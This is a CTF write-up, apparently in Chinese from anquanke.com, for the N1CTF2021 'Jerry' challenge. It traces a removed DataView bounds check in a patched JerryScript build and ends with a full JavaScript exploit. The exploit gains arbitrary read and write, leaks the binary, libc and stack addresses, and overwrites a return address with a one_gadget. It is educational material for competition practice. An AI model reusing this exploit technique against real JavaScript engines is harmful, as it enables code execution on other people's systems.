> 原文链接: https://www.anquanke.com//post/id/260633 


# N1CTF2021 Jerry  WP


                                阅读量   
                                **74381**
                            
                        |
                        
                                                                                    



[![](https://p5.ssl.qhimg.com/t01d34e5f6abb94fc49.jpg)](https://p5.ssl.qhimg.com/t01d34e5f6abb94fc49.jpg)



## 前言

上周我和队友们打了场N1CTF，最终取得第二名的成绩。这里是我解决的一个challenge，很可惜这题调远程的时候二血变成了三血。



## 环境准备

### <a class="reference-link" name="Bindiff"></a>Bindiff

#### <a class="reference-link" name="%E5%AE%89%E8%A3%85"></a>安装

在 [https://www.zynamics.com/software.html找到自己IDA对应的版本，比如我是7.6的IDA](https://www.zynamics.com/software.html%E6%89%BE%E5%88%B0%E8%87%AA%E5%B7%B1IDA%E5%AF%B9%E5%BA%94%E7%9A%84%E7%89%88%E6%9C%AC%EF%BC%8C%E6%AF%94%E5%A6%82%E6%88%91%E6%98%AF7.6%E7%9A%84IDA) ，我就下Bindiff7 而不是最上面那个lastest版本的，7.5也可以用7，以下就用6就行。

[![](https://p0.ssl.qhimg.com/t01ce0b349d9e410a92.png)](https://p0.ssl.qhimg.com/t01ce0b349d9e410a92.png)



## 前置知识

### <a class="reference-link" name="DataView%20Object"></a>DataView Object

```
#if JERRY_BUILTIN_DATAVIEW
/**
 * Description of DataView objects.
 */
typedef struct
`{`
  ecma_extended_object_t header; /**&lt; header part */
  ecma_object_t *buffer_p; /**&lt; [[ViewedArrayBuffer]] internal slot */
  uint32_t byte_offset; /**&lt; [[ByteOffset]] internal slot */
`}` ecma_dataview_object_t;
#endif /* JERRY_BUILTIN_DATAVIEW */
```
1. 一个DataView对象由以上部分构成。包括一个header，一个buffer_p，一个byte_offset。
1. 对DataView的Parse，通过一个Routine去实现的包含一个Switch判断一些操作然后设置对应的Flag，最终在通过一个函数—ecma_op_dataview_get_set_view_value 去实现。比如Set和Get。
```
ecma_value_t
ecma_builtin_dataview_prototype_dispatch_routine (uint8_t builtin_routine_id, /**&lt; built-in wide routine identifier */
                                                  ecma_value_t this_arg, /**&lt; 'this' argument value */
                                                  const ecma_value_t arguments_list_p[], /**&lt; list of arguments
                                                                                          *   passed to routine */
                                                  uint32_t arguments_number) /**&lt; length of arguments' list */
`{`
  ecma_value_t byte_offset = arguments_number &gt; 0 ? arguments_list_p[0] : ECMA_VALUE_UNDEFINED;

  switch (builtin_routine_id)
  `{`
    case ECMA_DATAVIEW_PROTOTYPE_BUFFER_GETTER:
    case ECMA_DATAVIEW_PROTOTYPE_BYTE_LENGTH_GETTER:
    case ECMA_DATAVIEW_PROTOTYPE_BYTE_OFFSET_GETTER:
    `{`
      return ecma_builtin_dataview_prototype_object_getters (this_arg, builtin_routine_id);
    `}`
    case ECMA_DATAVIEW_PROTOTYPE_GET_FLOAT32:
#if JERRY_NUMBER_TYPE_FLOAT64
    case ECMA_DATAVIEW_PROTOTYPE_GET_FLOAT64:
#endif /* JERRY_NUMBER_TYPE_FLOAT64 */
    case ECMA_DATAVIEW_PROTOTYPE_GET_INT16:
    case ECMA_DATAVIEW_PROTOTYPE_GET_INT32:
    case ECMA_DATAVIEW_PROTOTYPE_GET_UINT16:
    case ECMA_DATAVIEW_PROTOTYPE_GET_UINT32:
#if JERRY_BUILTIN_BIGINT
    case ECMA_DATAVIEW_PROTOTYPE_GET_BIGINT64:
    case ECMA_DATAVIEW_PROTOTYPE_GET_BIGUINT64:
#endif /* JERRY_BUILTIN_BIGINT */
    `{`
      ecma_value_t little_endian = arguments_number &gt; 1 ? arguments_list_p[1] : ECMA_VALUE_FALSE;
      ecma_typedarray_type_t id = (ecma_typedarray_type_t) (builtin_routine_id - ECMA_DATAVIEW_PROTOTYPE_GET_INT8);

      return ecma_op_dataview_get_set_view_value (this_arg, byte_offset, little_endian, ECMA_VALUE_EMPTY, id);
    `}`
    case ECMA_DATAVIEW_PROTOTYPE_SET_FLOAT32:
#if JERRY_NUMBER_TYPE_FLOAT64
    case ECMA_DATAVIEW_PROTOTYPE_SET_FLOAT64:
#endif /* JERRY_NUMBER_TYPE_FLOAT64 */
    case ECMA_DATAVIEW_PROTOTYPE_SET_INT16:
    case ECMA_DATAVIEW_PROTOTYPE_SET_INT32:
    case ECMA_DATAVIEW_PROTOTYPE_SET_UINT16:
    case ECMA_DATAVIEW_PROTOTYPE_SET_UINT32:
#if JERRY_BUILTIN_BIGINT
    case ECMA_DATAVIEW_PROTOTYPE_SET_BIGINT64:
    case ECMA_DATAVIEW_PROTOTYPE_SET_BIGUINT64:
#endif /* JERRY_BUILTIN_BIGINT */
    `{`
      ecma_value_t value_to_set = arguments_number &gt; 1 ? arguments_list_p[1] : ECMA_VALUE_UNDEFINED;
      ecma_value_t little_endian = arguments_number &gt; 2 ? arguments_list_p[2] : ECMA_VALUE_FALSE;
      ecma_typedarray_type_t id = (ecma_typedarray_type_t) (builtin_routine_id - ECMA_DATAVIEW_PROTOTYPE_SET_INT8);

      return ecma_op_dataview_get_set_view_value (this_arg, byte_offset, little_endian, value_to_set, id);
    `}`
    case ECMA_DATAVIEW_PROTOTYPE_GET_INT8:
    case ECMA_DATAVIEW_PROTOTYPE_GET_UINT8:
    `{`
      ecma_typedarray_type_t id = (ecma_typedarray_type_t) (builtin_routine_id - ECMA_DATAVIEW_PROTOTYPE_GET_INT8);

      return ecma_op_dataview_get_set_view_value (this_arg, byte_offset, ECMA_VALUE_FALSE, ECMA_VALUE_EMPTY, id);
    `}`
    default:
    `{`
      JERRY_ASSERT (builtin_routine_id == ECMA_DATAVIEW_PROTOTYPE_SET_INT8
                    || builtin_routine_id == ECMA_DATAVIEW_PROTOTYPE_SET_UINT8);
      ecma_value_t value_to_set = arguments_number &gt; 1 ? arguments_list_p[1] : ECMA_VALUE_UNDEFINED;
      ecma_typedarray_type_t id = (ecma_typedarray_type_t) (builtin_routine_id - ECMA_DATAVIEW_PROTOTYPE_SET_INT8);

      return ecma_op_dataview_get_set_view_value (this_arg, byte_offset, ECMA_VALUE_FALSE, value_to_set, id);
    `}`
  `}`
`}` /* ecma_builtin_dataview_prototype_dispatch_routine */
```

然后来看看这一函数。

```
ecma_value_t
ecma_op_dataview_get_set_view_value (ecma_value_t view, /**&lt; the operation's 'view' argument */
                                     ecma_value_t request_index, /**&lt; the operation's 'requestIndex' argument */
                                     ecma_value_t is_little_endian_value, /**&lt; the operation's
                                                                           *   'isLittleEndian' argument */
                                     ecma_value_t value_to_set, /**&lt; the operation's 'value' argument */
                                     ecma_typedarray_type_t id) /**&lt; the operation's 'type' argument */
`{`
  /* 1 - 2. */
  ecma_dataview_object_t *view_p = ecma_op_dataview_get_object (view);//object

  if (JERRY_UNLIKELY (view_p == NULL))
  `{`
    return ECMA_VALUE_ERROR;
  `}`

  ecma_object_t *buffer_p = view_p-&gt;buffer_p;//获取object属性里的buffer 
  JERRY_ASSERT (ecma_object_class_is (buffer_p, ECMA_OBJECT_CLASS_ARRAY_BUFFER)
                || ecma_object_class_is (buffer_p, ECMA_OBJECT_CLASS_SHARED_ARRAY_BUFFER));

  /* 3. */
  ecma_number_t get_index;
  ecma_value_t number_index_value = ecma_op_to_index (request_index, &amp;get_index);

  if (ECMA_IS_VALUE_ERROR (number_index_value))
  `{`
    return number_index_value;
  `}`

  /* SetViewValue 4 - 5. */
  if (!ecma_is_value_empty (value_to_set))
  `{`
#if JERRY_BUILTIN_BIGINT
    if (ECMA_TYPEDARRAY_IS_BIGINT_TYPE (id))
    `{`
      value_to_set = ecma_bigint_to_bigint (value_to_set, true);

      if (ECMA_IS_VALUE_ERROR (value_to_set))
      `{`
        return value_to_set;
      `}`
    `}`
    else
#endif /* JERRY_BUILTIN_BIGINT */
    `{`
      ecma_number_t value_to_set_number;
      ecma_value_t value = ecma_op_to_number (value_to_set, &amp;value_to_set_number);

      if (ECMA_IS_VALUE_ERROR (value))
      `{`
        return value;
      `}`

      value_to_set = ecma_make_number_value (value_to_set_number);
    `}`
  `}`

  /* GetViewValue 4., SetViewValue 6. */
  bool is_little_endian = ecma_op_to_boolean (is_little_endian_value);

  if (ecma_arraybuffer_is_detached (buffer_p))
  `{`
    ecma_free_value (value_to_set);
    return ecma_raise_type_error (ECMA_ERR_MSG (ecma_error_arraybuffer_is_detached));
  `}`

  /* GetViewValue 7., SetViewValue 9. */
  uint32_t view_offset = view_p-&gt;byte_offset;

  /* GetViewValue 8., SetViewValue 10. */
  uint32_t view_size = view_p-&gt;header.u.cls.u3.length;//获取object里的length

  /* GetViewValue 9., SetViewValue 11. */
  uint8_t element_size = (uint8_t) (1 &lt;&lt; (ecma_typedarray_helper_get_shift_size (id)));

  /* GetViewValue 10., SetViewValue 12. */
  if (get_index + element_size &gt; (ecma_number_t) view_size)//判断是否越界
  `{`
    ecma_free_value (value_to_set);
    return ecma_raise_range_error (ECMA_ERR_MSG ("Start offset is outside the bounds of the buffer"));
  `}`

  /* GetViewValue 11., SetViewValue 13. */
  //然后下面就是利用buffer_p取计算然后get值和设置值的操作。
  uint32_t buffer_index = (uint32_t) get_index + view_offset;
  lit_utf8_byte_t *block_p = ecma_arraybuffer_get_buffer (buffer_p) + buffer_index;

  bool system_is_little_endian = ecma_dataview_check_little_endian ();

  ecma_typedarray_info_t info;
  info.id = id;
  info.length = view_size;
  info.shift = ecma_typedarray_helper_get_shift_size (id);
  info.element_size = element_size;
  info.offset = view_p-&gt;byte_offset;
  info.array_buffer_p = buffer_p;

  /* GetViewValue 12. */
  if (ecma_is_value_empty (value_to_set))
  `{`
    JERRY_VLA (lit_utf8_byte_t, swap_block_p, element_size);
    memcpy (swap_block_p, block_p, element_size * sizeof (lit_utf8_byte_t));
    ecma_dataview_swap_order (system_is_little_endian, is_little_endian, element_size, swap_block_p);
    info.buffer_p = swap_block_p;
    return ecma_get_typedarray_element (&amp;info, 0);
  `}`
  if (!ecma_number_is_nan (get_index) &amp;&amp; get_index &lt;= 0)
  `{`
    get_index = 0;
  `}`
  /* SetViewValue 14. */
  info.buffer_p = block_p;
  ecma_value_t set_element = ecma_set_typedarray_element (&amp;info, value_to_set, 0);
  ecma_free_value (value_to_set);

  if (ECMA_IS_VALUE_ERROR (set_element))
  `{`
    return set_element;
  `}`

  ecma_dataview_swap_order (system_is_little_endian, is_little_endian, element_size, block_p);

  return ECMA_VALUE_UNDEFINED;
`}` /* ecma_op_dataview_get_set_view_value */
```

在ecma_create_object 里面调用jmem_heap_alloc 去分配地址，也就是说Jerry 有自己的一套内存管理机制，如下

```
static void * JERRY_ATTR_HOT
jmem_heap_alloc (const size_t size) /**&lt; size of requested block */
`{`
#if !JERRY_SYSTEM_ALLOCATOR
  /* Align size. */
  const size_t required_size = ((size + JMEM_ALIGNMENT - 1) / JMEM_ALIGNMENT) * JMEM_ALIGNMENT;
  jmem_heap_free_t *data_space_p = NULL;

  JMEM_VALGRIND_DEFINED_SPACE (&amp;JERRY_HEAP_CONTEXT (first), sizeof (jmem_heap_free_t));

  /* Fast path for 8 byte chunks, first region is guaranteed to be sufficient. */
  if (required_size == JMEM_ALIGNMENT
      &amp;&amp; JERRY_LIKELY (JERRY_HEAP_CONTEXT (first).next_offset != JMEM_HEAP_END_OF_LIST))
  `{`
    data_space_p = JMEM_HEAP_GET_ADDR_FROM_OFFSET (JERRY_HEAP_CONTEXT (first).next_offset);
    JERRY_ASSERT (jmem_is_heap_pointer (data_space_p));

    JMEM_VALGRIND_DEFINED_SPACE (data_space_p, sizeof (jmem_heap_free_t));
    JERRY_CONTEXT (jmem_heap_allocated_size) += JMEM_ALIGNMENT;

    if (JERRY_CONTEXT (jmem_heap_allocated_size) &gt;= JERRY_CONTEXT (jmem_heap_limit))
    `{`
      JERRY_CONTEXT (jmem_heap_limit) += CONFIG_GC_LIMIT;
    `}`

    if (data_space_p-&gt;size == JMEM_ALIGNMENT)
    `{`
      JERRY_HEAP_CONTEXT (first).next_offset = data_space_p-&gt;next_offset;
    `}`
    else
    `{`
      JERRY_ASSERT (data_space_p-&gt;size &gt; JMEM_ALIGNMENT);

      jmem_heap_free_t *remaining_p;
      remaining_p = JMEM_HEAP_GET_ADDR_FROM_OFFSET (JERRY_HEAP_CONTEXT (first).next_offset) + 1;

      JMEM_VALGRIND_DEFINED_SPACE (remaining_p, sizeof (jmem_heap_free_t));
      remaining_p-&gt;size = data_space_p-&gt;size - JMEM_ALIGNMENT;
      remaining_p-&gt;next_offset = data_space_p-&gt;next_offset;
      JMEM_VALGRIND_NOACCESS_SPACE (remaining_p, sizeof (jmem_heap_free_t));

      JERRY_HEAP_CONTEXT (first).next_offset = JMEM_HEAP_GET_OFFSET_FROM_ADDR (remaining_p);
    `}`

    JMEM_VALGRIND_NOACCESS_SPACE (data_space_p, sizeof (jmem_heap_free_t));

    if (JERRY_UNLIKELY (data_space_p == JERRY_CONTEXT (jmem_heap_list_skip_p)))
    `{`
      JERRY_CONTEXT (jmem_heap_list_skip_p) = JMEM_HEAP_GET_ADDR_FROM_OFFSET (JERRY_HEAP_CONTEXT (first).next_offset);
    `}`
  `}`
  /* Slow path for larger regions. */
  else
  `{`
    uint32_t current_offset = JERRY_HEAP_CONTEXT (first).next_offset;
    jmem_heap_free_t *prev_p = &amp;JERRY_HEAP_CONTEXT (first);

    while (JERRY_LIKELY (current_offset != JMEM_HEAP_END_OF_LIST))
    `{`
      jmem_heap_free_t *current_p = JMEM_HEAP_GET_ADDR_FROM_OFFSET (current_offset);
      JERRY_ASSERT (jmem_is_heap_pointer (current_p));
      JMEM_VALGRIND_DEFINED_SPACE (current_p, sizeof (jmem_heap_free_t));

      const uint32_t next_offset = current_p-&gt;next_offset;
      JERRY_ASSERT (next_offset == JMEM_HEAP_END_OF_LIST
                    || jmem_is_heap_pointer (JMEM_HEAP_GET_ADDR_FROM_OFFSET (next_offset)));

      if (current_p-&gt;size &gt;= required_size)
      `{`
        /* Region is sufficiently big, store address. */
        data_space_p = current_p;

        /* Region was larger than necessary. */
        if (current_p-&gt;size &gt; required_size)
        `{`
          /* Get address of remaining space. */
          jmem_heap_free_t *const remaining_p = (jmem_heap_free_t *) ((uint8_t *) current_p + required_size);

          /* Update metadata. */
          JMEM_VALGRIND_DEFINED_SPACE (remaining_p, sizeof (jmem_heap_free_t));
          remaining_p-&gt;size = current_p-&gt;size - (uint32_t) required_size;
          remaining_p-&gt;next_offset = next_offset;
          JMEM_VALGRIND_NOACCESS_SPACE (remaining_p, sizeof (jmem_heap_free_t));

          /* Update list. */
          JMEM_VALGRIND_DEFINED_SPACE (prev_p, sizeof (jmem_heap_free_t));
          prev_p-&gt;next_offset = JMEM_HEAP_GET_OFFSET_FROM_ADDR (remaining_p);
          JMEM_VALGRIND_NOACCESS_SPACE (prev_p, sizeof (jmem_heap_free_t));
        `}`
        /* Block is an exact fit. */
        else
        `{`
          /* Remove the region from the list. */
          JMEM_VALGRIND_DEFINED_SPACE (prev_p, sizeof (jmem_heap_free_t));
          prev_p-&gt;next_offset = next_offset;
          JMEM_VALGRIND_NOACCESS_SPACE (prev_p, sizeof (jmem_heap_free_t));
        `}`

        JERRY_CONTEXT (jmem_heap_list_skip_p) = prev_p;

        /* Found enough space. */
        JERRY_CONTEXT (jmem_heap_allocated_size) += required_size;

        while (JERRY_CONTEXT (jmem_heap_allocated_size) &gt;= JERRY_CONTEXT (jmem_heap_limit))
        `{`
          JERRY_CONTEXT (jmem_heap_limit) += CONFIG_GC_LIMIT;
        `}`

        break;
      `}`

      JMEM_VALGRIND_NOACCESS_SPACE (current_p, sizeof (jmem_heap_free_t));
      /* Next in list. */
      prev_p = current_p;
      current_offset = next_offset;
    `}`
  `}`

  JMEM_VALGRIND_NOACCESS_SPACE (&amp;JERRY_HEAP_CONTEXT (first), sizeof (jmem_heap_free_t));

  JERRY_ASSERT ((uintptr_t) data_space_p % JMEM_ALIGNMENT == 0);
  JMEM_VALGRIND_MALLOCLIKE_SPACE (data_space_p, size);

  return (void *) data_space_p;
#else /* JERRY_SYSTEM_ALLOCATOR */
  JERRY_CONTEXT (jmem_heap_allocated_size) += size;

  while (JERRY_CONTEXT (jmem_heap_allocated_size) &gt;= JERRY_CONTEXT (jmem_heap_limit))
  `{`
    JERRY_CONTEXT (jmem_heap_limit) += CONFIG_GC_LIMIT;
  `}`

  return malloc (size);
#endif /* !JERRY_SYSTEM_ALLOCATOR */
`}` /* jmem_heap_alloc */
struct jmem_heap_t
`{`
  jmem_heap_free_t first; /**&lt; first node in free region list */
  uint8_t area[JMEM_HEAP_AREA_SIZE]; /**&lt; heap area */
`}`;

/**
 * Global heap.
 */
extern jmem_heap_t jerry_global_heap;

/**
 * Provides a reference to a field of the heap.
 */
#define JERRY_HEAP_CONTEXT(field) (jerry_global_heap.field)
```

也就是说最终使用jerry_global_heap来管理，而且这个jerry_global_heap也是固定于代码加载基地址的。



## N1CTF &amp;&amp;Jerry

### <a class="reference-link" name="1.%E5%88%86%E6%9E%90%E6%BC%8F%E6%B4%9E%E7%82%B9"></a>1.分析漏洞点

题目给了个Jerry,然后一般这种浏览器是会给diff的，但这题没有给，需要我们通过他给的Binary 去反推他打了什么补丁。首先通过运行时选项找到Version和commit

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01bcd51b1d1c6039db.png)

然后release版本的strip版本和非strip版本都编译一遍。

```
git clone https://github.com/jerryscript-project/jerryscript.git
cd jerryscript
git reset --hard d4178ae3
python tools/build.py //python tools/build.py --strip=off
```

[![](https://p1.ssl.qhimg.com/t019185359943571c8d.png)](https://p1.ssl.qhimg.com/t019185359943571c8d.png)

发现我们自己编译的release strip 版本和题目给的版本就一个函数 有差别。然后记住release strip 这个偏移—0x2643d。然后用IDA 打开没有strip版本的Binary ，因为有符号所以我们可以迅速定位到是哪个函数进行了修改，而strip 版本和非strip版本函数的偏移是一样的。

最终利用偏移搜索发现是这个函数。

[![](https://p2.ssl.qhimg.com/t010fda3dc52a0957bb.png)](https://p2.ssl.qhimg.com/t010fda3dc52a0957bb.png)

然后我们拿这个和题目的对比这一函数的具体代码。可以看到在题目给的Binary 比我们编译的少了一个检查。但是具体也说不清是怎么回事，所以我们去查看源代码。找到对应的函数。

[![](https://p2.ssl.qhimg.com/t01a0a1d1855b7f7745.png)](https://p2.ssl.qhimg.com/t01a0a1d1855b7f7745.png)

这里是部分对应代码由于这个ecma_builtin_dataview_dispatch_construct 最终调用ecma_op_dataview_create ，所以我看查看ecma_op_dataview_create 部分源码。

```
ecma_value_t
ecma_builtin_dataview_dispatch_construct (const ecma_value_t *arguments_list_p, /**&lt; arguments list */
                                          uint32_t arguments_list_len) /**&lt; number of arguments */
`{`
  return ecma_op_dataview_create (arguments_list_p, arguments_list_len);
`}` /* ecma_builtin_dataview_dispatch_construct */
```

通过上下文很容易找出是这里被删掉了就是我打的注释的部分。

```
ecma_value_t
ecma_op_dataview_create (const ecma_value_t *arguments_list_p, /**&lt; arguments list */
                         uint32_t arguments_list_len) /**&lt; number of arguments */
`{`
[...]
  uint32_t view_byte_length;
  if (arguments_list_len &gt; 2 &amp;&amp; !ecma_is_value_undefined (arguments_list_p[2]))
  `{`
    /* 8.a */
    ecma_number_t byte_length_to_index;
    //获取第二个参数赋值
    ecma_value_t byte_length_value = ecma_op_to_index (arguments_list_p[2], &amp;byte_length_to_index);

    if (ECMA_IS_VALUE_ERROR (byte_length_value))
    `{`
      return byte_length_value;
    `}`

    /* 8.b */
    // if (offset + byte_length_to_index &gt; buffer_byte_length)
    // `{`
    //   return ecma_raise_range_error (ECMA_ERR_MSG ("Start offset is outside the bounds of the buffer"));
    // `}`

    //JERRY_ASSERT (byte_length_to_index &lt;= UINT32_MAX);
    view_byte_length = (uint32_t) byte_length_to_index;
  `}`
[...]
  ecma_object_t *object_p = ecma_create_object (prototype_obj_p,
                                                sizeof (ecma_dataview_object_t),
                                                ECMA_OBJECT_TYPE_CLASS);

  ecma_deref_object (prototype_obj_p);

  /* 11 - 14. */
  ecma_dataview_object_t *dataview_obj_p = (ecma_dataview_object_t *) object_p;
  dataview_obj_p-&gt;header.u.cls.type = ECMA_OBJECT_CLASS_DATAVIEW;
  dataview_obj_p-&gt;header.u.cls.u3.length = view_byte_length;//赋值给length
  dataview_obj_p-&gt;buffer_p = buffer_p;
  dataview_obj_p-&gt;byte_offset = (uint32_t) offset;

  return ecma_make_object_value (object_p);
`}` /* ecma_op_dataview_create */
```

根据上下文可以分析出来这一段判断是否越界的，再设置长度的，去掉这一判断就可以造成设置length的越界。然后根据前置知识我们就是可以获得一个DataView的OOB，接下来我们只需要更改buffer_p就可以任意地址R/W了。这里由于Jerry用的自己的一套内存管理最好选择打栈的返回地址最好。

### <a class="reference-link" name="2.%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>2.漏洞利用

漏洞利用就没什么能说的了，我直接拿题目给的去调的。本机环境20.04，题目给的是21.04不过差别不大，本机调完对远程改个偏移就能通了。

首先看下Debug版本中DataView的内存分布。直接下断点到ecma-dataview-object.c:155。

然后就可以利用Debug 版本的优化 自由输出变量的值。

```
var buffer = new ArrayBuffer(0x10)
var buffer2 = new ArrayBuffer(0x10)
data2=new DataView(buffer,0,0x100)
data=new DataView(buffer2,0,0x100)
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0177b71ea2f3a3eff5.png)

第一个箭头是buffer_p，第二个是length。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0115ac81862664f7d1.png)

可以看到这两个DataView对象离得不远，然后我们可以通过OOB用第一个去设置第二个的Buffer，造成ABR/W，然后leak textbase，leak libc，leak stack ，最终改写main函数返回地址为One_gadget。

### <a class="reference-link" name="3.Exploit"></a>3.Exploit

Ubuntu20.04，题目给的Binary不好下断点的话，就用assert就行了。

```
var buffer = new ArrayBuffer(0x10)
var buffer2 = new ArrayBuffer(0x10)
data2=new DataView(buffer,0,0x100)
data=new DataView(buffer2,0,0x100)
data.setUint32(0,0x41414141)
data.setUint32(4,0x41414141)
data2.setUint32(0,0x42424242)
data2.setUint32(4,0x42424242)
jerry_gloal_heap_offset=0x68
jerry_gloal_heap=data.getUint32(jerry_gloal_heap_offset+4,true)*0x100000000+data.getUint32(jerry_gloal_heap_offset,true)
text_base=jerry_gloal_heap-0x6d458
realloc_got=text_base+0x00000000006bf00+0x10
print(jerry_gloal_heap.toString(16))
print(text_base.toString(16))
print(realloc_got.toString(16))
data.setUint32(jerry_gloal_heap_offset,realloc_got&amp;0xffffffff,true)

libc_base=data2.getUint32(4,true)*0x100000000+data2.getUint32(0,true)-0x9e000
print(libc_base.toString(16))
env=libc_base+0x1ef2e0-0x10
print(env.toString(16))
data.setUint32(jerry_gloal_heap_offset,env&amp;0xffffffff,true)
data.setUint32(jerry_gloal_heap_offset+4,env/0x100000000,true)

stack=data2.getUint32(4,true)*0x100000000+data2.getUint32(0,true)
print(stack.toString(16))
ret_addr=stack-0x108-0x10
ogg=libc_base+[0xe6c7e,0xe6c81,0xe6c84][1]
data.setUint32(jerry_gloal_heap_offset,ret_addr&amp;0xffffffff,true)
data.setUint32(jerry_gloal_heap_offset+4,ret_addr/0x100000000,true)
data2.setUint32(0,ogg&amp;0xffffffff,true)
data2.setUint32(4,ogg/0x100000000,true)

//assert(1==2)
```

[![](https://p2.ssl.qhimg.com/t014b8fdfb76dabe737.png)](https://p2.ssl.qhimg.com/t014b8fdfb76dabe737.png)
